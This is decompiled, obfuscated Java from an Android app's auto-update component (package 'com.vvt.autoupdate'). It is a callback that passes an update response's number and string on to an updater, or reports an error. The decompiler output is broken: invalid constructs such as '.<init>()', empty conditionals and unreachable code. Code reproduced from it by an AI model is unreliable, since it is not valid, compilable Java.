package com.vvt.autoupdate;

class b
  implements com.vvt.datadeliverymanager.a.a
{
  b(a parama) {}
  
  public void a(com.vvt.datadeliverymanager.i parami) {}
  
  public void b(com.vvt.datadeliverymanager.i parami)
  {
    boolean bool = a.d();
    if (bool) {}
    bool = a.d();
    if (bool) {}
    bool = parami.f();
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject1 = parami.a();
        localObject1 = (com.vvt.phoenix.prot.command.a.i)localObject1;
        long l = ((com.vvt.phoenix.prot.command.a.i)localObject1).c();
        String str = ((com.vvt.phoenix.prot.command.a.i)localObject1).d();
        ((com.vvt.phoenix.prot.command.a.i)localObject1).b();
        bool = a.d();
        if (bool) {}
        localObject1 = this.a;
        a.a((a)localObject1, l, str);
      }
      catch (Exception localException)
      {
        Object localObject3 = a.a(this.a);
        if (localObject3 == null) {
          continue;
        }
        localObject3 = new com/vvt/datadeliverymanager/i;
        ((com.vvt.datadeliverymanager.i)localObject3).<init>();
        ((com.vvt.datadeliverymanager.i)localObject3).b(false);
        localObject2 = localException.getMessage();
        ((com.vvt.datadeliverymanager.i)localObject3).a((String)localObject2);
        localObject2 = a.a(this.a);
        ((com.vvt.datadeliverymanager.a.a)localObject2).b((com.vvt.datadeliverymanager.i)localObject3);
        continue;
        bool = a.d();
        if (!bool) {
          continue;
        }
        continue;
      }
      bool = a.d();
      if (bool) {}
      return;
      Object localObject2 = a.a(this.a);
      if (localObject2 != null)
      {
        localObject2 = a.a(this.a);
        ((com.vvt.datadeliverymanager.a.a)localObject2).b(parami);
      }
      else
      {
        bool = a.d();
        if (!bool) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/autoupdate/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */